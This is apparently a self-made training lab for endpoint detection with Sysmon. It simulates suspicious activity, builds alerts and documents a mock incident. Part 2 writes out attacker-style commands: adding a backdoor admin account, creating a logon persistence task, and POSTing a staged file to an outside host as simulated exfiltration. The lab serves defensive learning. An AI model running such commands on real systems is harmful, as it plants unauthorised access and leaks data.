## **Endpoint Detection and Response (EDR) Lab: Detecting and Investigating Suspicious Activity**

### Lab Objective:
In this lab, you'll simulate suspicious endpoint behavior, configure EDR-like monitoring on a Windows machine using Sysmon, create alerts for potential malicious actions, and respond to these alerts as if they were real incidents. This lab will provide hands-on experience with real-time monitoring, log analysis, and the investigative process, preparing you to handle suspicious endpoint activities in a real-world scenario.

This was created with the intention to polish up my skills and help those learning like I am now.

---

### **Scenario**:
Imagine you are an EDR analyst at a financial company that has recently experienced unauthorized logins and unusual PowerShell activity on a few workstations. To prevent further incidents, you need to set up endpoint monitoring, detect abnormal behavior, and analyze the data to determine if an attacker is actively moving within your network.

This lab is divided into four sections:
1. **Initial Setup and Sysmon Configuration**
2. **Simulating Suspicious Endpoint Activities**
3. **Creating Alerts and Analyzing Suspicious Activity**
4. **Documenting the Incident and Recommendations**

---

### **Part 1: Initial Setup and Sysmon Configuration**

1. **Environment Setup**:
   - Set up a Windows VM where you’ll configure Sysmon. Ensure the VM is isolated from your primary network.
   - Download **Sysmon** from the [Microsoft Sysinternals website](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon).
   
2. **Install and Configure Sysmon**:
   - Install Sysmon with a configuration file that specifies the types of events to monitor (e.g., process creation, file creation, network connections). Use the following PowerShell command:
     ```powershell
     sysmon -accepteula -i sysmonconfig.xml
     ```
     - You can use an existing configuration file like [SwiftOnSecurity's Sysmon configuration](https://github.com/SwiftOnSecurity/sysmon-config), which includes a range of rules for detecting suspicious activity.

   - Review the configuration and modify it if necessary to capture specific events for this lab. Focus on:
     - **Process Creation** (Event ID 1): Logs processes that start on the system.
     - **Network Connections** (Event ID 3): Captures network connections, useful for detecting lateral movement or exfiltration.
     - **File Creation** (Event ID 11): Logs new files created, which can help detect malicious files or data staging.
   
3. **Verifying Sysmon Logging**:
   - Open Event Viewer and navigate to **Applications and Services Logs > Microsoft > Sysmon > Operational**.
   - Generate test events by opening PowerShell, launching applications, and creating network connections.
   - Verify that Sysmon is logging these activities under the correct Event IDs. Document any modifications you make to the configuration.

---

### **Part 2: Simulating Suspicious Endpoint Activities**

In this section, you’ll simulate various types of suspicious behavior on the endpoint. Each activity will trigger specific Sysmon events, helping you understand how typical suspicious activities appear in logs.

1. **Simulate a Suspicious PowerShell Command**:
   - Run a PowerShell command that is often flagged as suspicious:
     ```powershell
     Invoke-WebRequest -Uri "http://example.com" -OutFile "C:\temp\example.txt"
     ```
   - This command downloads a file from a remote location, which is often associated with malware downloads or data exfiltration.
   - Check the Sysmon logs for the **Process Creation (Event ID 1)** and **Network Connection (Event ID 3)** events related to this command.

2. **Simulate Unauthorized User Account Activity**:
   - Create a new local user account to simulate an unauthorized user:
     ```powershell
     net user attacker password123 /add
     ```
   - Then, add the account to the Administrators group:
     ```powershell
     net localgroup administrators attacker /add
     ```
   - Review Sysmon and Windows Security logs for events associated with account creation and privilege escalation. Note that Sysmon doesn’t log these activities by default, so you’ll also need to check the **Security** log in Event Viewer.

3. **Create Suspicious Scheduled Task**:
   - Create a scheduled task to simulate persistence:
     ```powershell
     schtasks /create /tn "UpdateTask" /tr "cmd.exe /c calc.exe" /sc onlogon
     ```
   - This task launches `calc.exe` (Calculator) at every logon, simulating a method attackers often use for persistence.
   - Review Sysmon logs for **Process Creation (Event ID 1)**, which should capture the creation of the scheduled task.

4. **Create Suspicious File and Network Activity**:
   - Create a sample file in `C:\Windows\Temp\` to simulate data staging:
     ```powershell
     echo "Sensitive Data" > C:\Windows\Temp\sensitive.txt
     ```
   - Run a data exfiltration simulation by uploading the file:
     ```powershell
     Invoke-WebRequest -Uri "http://example.com/upload" -Method Post -InFile "C:\Windows\Temp\sensitive.txt"
     ```
   - Check Sysmon for **File Creation (Event ID 11)** and **Network Connection (Event ID 3)** logs to identify the file creation and attempted exfiltration.

---

### **Part 3: Creating Alerts and Analyzing Suspicious Activity**

1. **Creating Custom Alerts**:
   - Use a tool like **Log Analytics** or **Splunk** (if available) to create custom alerts based on the Sysmon log data.
   - Set up alerts to trigger for specific Event IDs and suspicious command patterns:
     - **Event ID 1 (Process Creation)**: Alert for PowerShell scripts downloading files or making network connections.
     - **Event ID 3 (Network Connection)**: Alert for connections to suspicious IP addresses or high-traffic destinations.
     - **Event ID 11 (File Creation)**: Alert for new files created in `C:\Windows\Temp\` or other unusual locations.

2. **Analyze Logs for Suspicious Patterns**:
   - Go through the Sysmon logs in Event Viewer or a SIEM solution to identify suspicious patterns:
     - **Suspicious PowerShell Activity**: Look for `Invoke-WebRequest` commands that may indicate downloading or data exfiltration attempts.
     - **Unauthorized Account Activity**: Look for any unauthorized account creation and privilege escalation activities.
     - **Persistence Mechanisms**: Check for scheduled tasks or startup registry modifications.
     - **Data Staging and Exfiltration**: Identify files created in unusual locations (e.g., Temp folder) and network connections to unknown IP addresses.

3. **Investigate Alerted Events**:
   - For each alert that is triggered, document the investigation process:
     - Identify the origin of the alert (e.g., process name, command line, IP address).
     - Check for additional related events (e.g., after a PowerShell download command, look for file creations or additional network connections).
     - Assess whether each alert indicates potential compromise or false positives.

---

### **Part 4: Documenting the Incident and Recommendations**

1. **Document the Incident**:
   - Create a report summarizing each simulated suspicious activity, how it was detected, and the results of the investigation.
   - Include screenshots of each step, especially the Sysmon logs corresponding to each suspicious action.
   - Include explanations of false positives encountered during the analysis and steps taken to refine alert accuracy.

2. **Incident Summary**:
   - Describe the hypothetical incident in a high-level summary.
   - Explain how EDR tools help to detect and investigate suspicious activity on endpoints.
   - Highlight the challenges of detecting certain activities without a properly tuned EDR configuration.

3. **Recommendations**:
   - Suggest additional configurations or tools that would improve detection accuracy:
     - Use of more advanced EDR tools with built-in behavioral analysis (e.g., CrowdStrike, SentinelOne).
     - Configuring Sysmon to capture additional event types for more comprehensive monitoring.
     - Suggest integrating threat intelligence feeds to enhance detection of known malicious IPs.

4. **Reflection Questions**:
   - How can Sysmon and EDR tools be fine-tuned to minimize false positives?
   - In a real-world scenario, what steps would you take if you found evidence of a potential breach?
   - How would you ensure that alerts do not miss legitimate malicious activities?

---

### **Lab Deliverables**:

1. **Detailed Incident Report**:
   - A comprehensive report covering each stage of the lab, including screenshots and observations for each simulated activity.

2. **Sysmon Configuration File**:
   - Include the Sysmon configuration file you used or modified for the lab, highlighting any customizations made for capturing specific events.

3. **Summary of Findings and Recommendations**:
   - Summarize key findings and provide a list of recommendations to improve endpoint monitoring and security.

4. **Reflection and Discussion**:
   - Answers to reflection questions on improving detection capabilities and responding to incidents effectively.

---

This lab will provide practical knowledge of how EDR systems operate, how Sysmon can be leveraged as a lightweight EDR tool, and how to identify and analyze suspicious activities.
